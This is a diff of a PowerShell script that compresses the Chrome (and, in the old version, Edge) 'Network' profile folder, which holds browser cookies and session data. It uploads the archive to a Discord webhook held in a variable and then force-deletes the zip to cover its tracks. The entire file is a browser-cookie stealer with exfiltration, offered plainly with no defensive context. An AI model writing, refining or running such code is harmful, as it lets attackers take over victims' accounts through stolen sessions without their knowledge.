@@ -1,28 +1,19 @@
-# Get current Windows username
-$currentUser = $env:USERNAME
+# Set variables for the folder to be zipped and the destination ZIP file
+$currentUser = $env:USERPROFILE
+$sourceFolder = "$currentUser\AppData\Local\Google\Chrome\User Data\Default\Network"
+$zipFileName = "NetworkData.zip"
+$zipFilePath = "$env:TEMP\$zipFileName"
 
-# Define folder paths
-$chromeNetworkFolder = "C:\Users\$currentUser\AppData\Local\Google\Chrome\User Data\Default\Network"
-$edgeNetworkFolder = "C:\Users\$currentUser\AppData\Local\Microsoft\Edge\User Data\Default\Network"
+# Compress the folder to a zip file
+Compress-Archive -Path $sourceFolder\* -DestinationPath $zipFilePath
 
-# Define zip file names
-$chromeZip = "$env:TEMP\ChromeNetwork.zip"
-$edgeZip = "$env:TEMP\EdgeNetwork.zip"
-
-# Compress the Chrome network folder
-Compress-Archive -Path $chromeNetworkFolder -DestinationPath $chromeZip
-
-# Compress the Edge network folder
-Compress-Archive -Path $edgeNetworkFolder -DestinationPath $edgeZip
-
-# Discord webhook upload function
+# Function to upload the zip file to Discord
 function Upload-Discord {
-    [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$False)]
+        [parameter(Position=0,Mandatory=$False)]
         [string]$file,
-        [parameter(Position=1, Mandatory=$False)]
-        [string]$text
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
     )
 
     $hookurl = "$dc"
@@ -41,9 +32,8 @@ function Upload-Discord {
     }
 }
 
-# Upload the zipped files to Discord
-Upload-Discord -file $chromeZip
-Upload-Discord -file $edgeZip
+# Upload the zip file to Discord
+Upload-Discord -file $zipFilePath -text "Here is the zipped Network data."
 
-# Clean up: remove the zip files after upload
-Remove-Item -Path $chromeZip, $edgeZip -Force
+# Clean up: Delete the zip file after upload
+Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
